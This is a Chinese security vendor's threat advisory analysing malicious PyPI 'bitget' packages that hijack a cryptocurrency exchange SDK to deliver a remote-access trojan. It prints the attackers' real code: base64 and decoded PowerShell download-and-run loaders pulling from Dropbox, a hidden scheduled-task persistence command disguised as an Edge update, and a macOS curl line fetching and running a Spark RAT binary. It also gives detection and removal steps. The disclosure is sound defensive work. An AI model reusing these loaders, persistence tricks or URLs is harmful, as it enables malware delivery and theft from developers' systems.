---
title: SBOM情报预警 | 恶意Py包劫持数字货币平台API SDK开展远控木马投毒
url: https://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647795309&idx=1&sn=1595a8f82571a0b0f3c282f8a6c520fa&chksm=8770ae3ab007272c6b6cbf3a6760f3401df22b99ff30a52bfed0f0c92a296538c68d6b1b6d98&scene=58&subscene=0#rd
source: 悬镜安全
date: 2024-12-20
fetch_date: 2025-10-06T19:42:05.450849
---

# SBOM情报预警 | 恶意Py包劫持数字货币平台API SDK开展远控木马投毒

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9Sypf4wrqoa4YHTHuNTDSUXQyXpdC8NDohnuCD7xMabV1QtUHROy2Yj0w/0?wx_fmt=jpeg)

# SBOM情报预警 | 恶意Py包劫持数字货币平台API SDK开展远控木马投毒

原创

悬镜安全情报中心

悬镜安全

![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGgALRzA4dxvk3TIxjvYl6iaZYTLlFC0WhuKC0ogplsM3dbjcqyicYMDyQWMsI3RiawC0PfeERBeMiaIzg/640?wx_fmt=gif)

**SBOM情报概述**

Summary

上周（2024.12.13~12.14），悬镜供应链安全情报中心在Pypi官方仓库（https://pypi.org）中捕获多起针对Windows和Mac系统Python开发者的恶意木马攻击事件。投毒者连续发布4个bitget系列Py恶意包，企图伪装并劫持开发者系统中合法的Bitget数字货币交易平台API SDK（PybitgetApi）开展远控木马后门投毒攻击。

![](https://mmbiz.qpic.cn/mmbiz_jpg/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyyQ9lg5tqCzgaI4bhDicWCDeZJqfTiaou7iaIicP9CdeVLQWCLO771UDPPw/640?wx_fmt=jpeg&from=appmsg)

bitget系列恶意包

截至目前，根据Pypi官方接口统计，bitget系列恶意Py包总下载量为737次。悬镜安全已于第一时间将该系列投毒恶意包向XSBOM供应链安全情报订阅用户进行推送预警。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyReBuc9njHX42B9tvfDB0Uk4U7m4ChmbID9BDQI3iak40FeNTKvoEozA/640?wx_fmt=png&from=appmsg)

bitget系列恶意包总下载量

**投毒分析**

Poisoning Analysis

以 python-bitget-wrapper 恶意包为例，bitget系列恶意Py包主要功能是针对开发者系统中的PybitgetApi SDK目录进行覆盖劫持并注入攻击代码，当开发者调用该SDK时，将静默触发恶意Py包中的攻击代码，完成远程下载并持久化运行窃取系统敏感信息的powershell脚本以及基于Go语言开发的远控木马后门。

1

**SDK 劫 持**

![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyO3iaIabN3ia5FojME881kpcVwbt1iakavLYPAqyNEgk7CexK4MYMXy6kQ/640?wx_fmt=gif&from=appmsg)

Pypi仓库的bitget数字货币交易所API SDK（PybitgetApi）在安装后会在系统python库目录下生成PyBitgetApi模块，开发者可通过 from PyBitgetApi import \* 加载使用该SDK。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyicibcFonUPkOuvSicYwibkPXhEGrp7JTRr6W34oaIKpIujNaueAk3znCEA/640?wx_fmt=png&from=appmsg)

PybitgetApi  SDK仓库主页

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyQXKkb6nTYicnun0RKBA6SzTcLuxJjaLicIHEBrjibpRKibTb4uSf9iaWricQ/640?wx_fmt=png&from=appmsg)

PyBitgetApi模块目录

bitget系列恶意Py包的源码中内置pybigetapi目录，并且在pybigetapi/\_\_init\_\_.py文件中植入投毒代码（如下所示）。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyjGxyR22vsO7Q0rqBaiaPP1aZnRib7X02icO3k4JH5Epp88FvY6Fp2Zu2g/640?wx_fmt=png&from=appmsg)

bitget系列恶意包投毒代码

当开发者在Windows系统上错误安装bitget系列恶意包后，系统中原有的合法Bitget Api SDK的PyBitgetApi模块目录会被恶意包的pybitgetapi目录强制替换，导致合法的SDK被劫持。

如下图所示，在安装python-bitget-wrapper 恶意包后，系统中PyBitgetApi模块目录下的\_\_init\_\_.py随即也被bitget系列恶意包的pybigetapi/\_\_init\_\_.py恶意文件覆盖。后续开发者调用PyBitgetApi模块都将会自动触发执行\_\_init\_\_.py中的投毒代码。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyxAlVRSZYrSnqo1TT8uKsWmauGYRNQ5RnWsusZSgkHkXqAbS9zlhUrw/640?wx_fmt=png&from=appmsg)

PyBitgetApi模块劫持

2

**系统信息窃取**

![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyO3iaIabN3ia5FojME881kpcVwbt1iakavLYPAqyNEgk7CexK4MYMXy6kQ/640?wx_fmt=gif&from=appmsg)

当开发者使用Windows系统时，pybigetapi/\_\_init\_\_.py文件中的恶意代码将执行以下一段base64编码的powershell脚本。

```
$ss="JGFhYSA9IEpvaW4tUGF0aCAoW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKSkgIm9zLnBzMSI7IHdnZXQgLVVyaSAiaHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3NjbC9maS9ia2hlazZ6cWJvMGNxZ2JvdGVlZ2ovMS50eHQ/cmxrZXk9eW4xOG01M2pheWJhNGUzbTViZGkwMmN6bSZzdD1laDFlZG1mMCZkbD0wIiAtT3V0RmlsZSAkYWFhOyAgJiAkYWFhOyBSZW1vdmUtSXRlbSAtUGF0aCAkYWFhIC1Gb3JjZTs="; $aa=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ss));$cc = $env:appdata;$dd = "user.ps1";$ee = Join-Path $cc $dd;$aa | Out-File -FilePath $ee; $aaaaa= 89897878; & $ee; Remove-Item -Path $ee -Force;
```

base64解码后，真实的powershell脚本（user.ps1）如下所示，利用wget从远程服务器下载新的powershell脚本（os.ps1）到系统上执行。

```
$aaa = Join-Path ([System.IO.Path]::GetTempPath()) "os.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/bkhek6zqbo0cqgboteegj/1.txt?rlkey=yn18m53jayba4e3m5bdi02czm&st=eh1edmf0&dl=0" -OutFile $aaa;  & $aaa; Remove-Item -Path $aaa -Force;
```

远程powershell脚本（os.ps1）内容如下所示，将再次远程下载并执行两个新的powershell脚本（msupdate.ps1和system\_first.ps1）。

```
$BPS = Join-Path ($env:AppData) "msupdate.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/5z7u901sdzoqz00li94n1/system-x.txt?rlkey=61jkj43d1ix2s785wgdkvl9po&st=sonqsoi6&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;'; $str | Out-File -FilePath $BPS -Encoding UTF8; $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-WindowStyle Hidden -nop  -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& {$abc = Join-Path ($env:AppData) \"msupdate.ps1\"; & $abc;}"'; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(15) -RepetitionInterval (New-TimeSpan -Minutes 30); $settings = New-ScheduledTaskSettingsSet -Hidden; Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUA{08D75543-4129-40F4-81D2-EB97D3D54985}" -Action $action -Trigger $trigger -Settings $settings;  $aaa = Join-Path ($env:AppData) "system_first.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/pcda4919r00y20rplmqrn/system-f.txt?rlkey=3aqcyuzbc8h6clctfk3nabqjk&st=n63y43d8&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;
```

以system\_first.ps1为例，该powershell脚本主要功能是收集开发者系统的类型、安装日期、启动时间、进程列表等信息，并通过文件形式打包后上传到服务器

（[https://content.dropboxapi.com/2/files/upload）。](https://content.dropboxapi.com/2/files/upload%EF%BC%89%E3%80%82)

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyI9RQqFnbK3Mv1QXAg7YYgQMHIpXxaeRQqRTV3eocF5l4OicTh0pZqIg/640?wx_fmt=png&from=appmsg)

system\_first.ps1窃取系统信息

3

**远控木马后门**

![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyO3iaIabN3ia5FojME881kpcVwbt1iakavLYPAqyNEgk7CexK4MYMXy6kQ/640?wx_fmt=gif&from=appmsg)

对于Mac系统，pybigetapi/\_\_init\_\_.py则会远程下载并执行Mach-O可执行程序（1.bin）。

```
elif os.name == "posix":        command = 'curl -L "https://dl.dropboxusercontent.com/scl/fi/6hg0a8fg9m36eahv88rwo/template?rlkey=0vkaw44mh3gak6y82l4ht39zg&st=ygbc7qgh&dl=0" -o "/Users/shared/1.bin" && chmod 777 "/Users/shared/1.bin" && "/Users/shared/1.bin" &> /dev/null &'        subprocess.run(command, shell=True, capture_output=True, text=True)
```

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SypAHY2gy4ynBIiaoDP9lwUqAA5ric1LMmVRw2pPsUEAI1LA4OnB0icGW5Q/640?wx_fmt=png&from=appmsg)

1.bin 可执行程序格式

通过逆向分析1.bin，根据代码功能模块以及源码目录结构信息，可溯源到1.bin实际为Spark远控客户端程序，基于Go语言开发编译。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyPF0thkTqOoictWnjDR1oFicqdvqmsLp8Kp3M1cgukriakfjaNAYn8p5pQ/640?wx_fmt=png&from=appmsg)

1.bin 远控功能模块

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyiaexIWrfY3mqiaeyYiaHctJjpFUjpXxnEWCFV78z3jcAqbwnXl9gKfe2g/640?wx_fmt=png&from=appmsg)

1.bin 源代码结构信息

Spark 作为一款开源、跨平台、功能齐全的 RAT远控工具

（https://github.com/XZB-1248/Spark），可实现通过浏览器控制所有受控设备。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyPGaSOAzszK2vmOgPibDEA02vMpygfYM7wcb2t7m4cHvp5vXas5DALAg/640?wx_fmt=png&from=appmsg)

Spark 远控项目

在VirusTotal上，1.bin被13款杀毒引擎检出为trojan.spark恶意木马，检出率约20%（13/63）。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyGG5gtltQEMVF48K41rggoxPAtu4ZGcfj7t0StgncOdpWicU4LiaRUY8Q/640?wx_fmt=png&from=appmsg)

VirusTotal检测结果

4

**IoC 数据**

![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyO3iaIabN3ia5FojME881kpcVwbt1iakavLYPAqyNEgk7CexK4MYMXy6kQ/640?wx_fmt=gif&from=appmsg)

本次捕获的Bitget系列投毒Py包涉及的恶意IoC数据如下表所示：

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgduEia5UIYkc65iax9j2n9SyJHMzicQdKjH4QGnc6PblucJP4r8auic5sLhBr5dYXbn78gD1NpVEl2AA/640?wx_fmt=png&from=appmsg)

**排查方式**

Investigation Method

开发者可通过命令 pip show python-bitget-wrapper 快速排查是否误安装或引用该恶意py组件包。若已安装该恶意组件，请尽快通过命令 pip uninstall python-bitget-wrapper -y 命令进行卸载，同时还需关闭系统网络并排查系统是否存在异常进程。

此外，也可使用 OpenSCA-cli 工具将受影响的组件包按如下示例保存为db.json文件，直接执行扫描命令（opensca-cli -db db.json -path ${project\_path}），即可快速获知您的项目是否受到投毒包影响。

```
[     {         "product": "python-bitget-wrapper",         "version": "[0.3.5]",         "language": "python",         "id": "XMIRROR-MAL45-8055AED",         "description": "恶意Py包劫持 PyBitgetApi SDK 开展远控木马投毒",         "release_date": "2024-12-14"       },       {         "product": "python-bitg...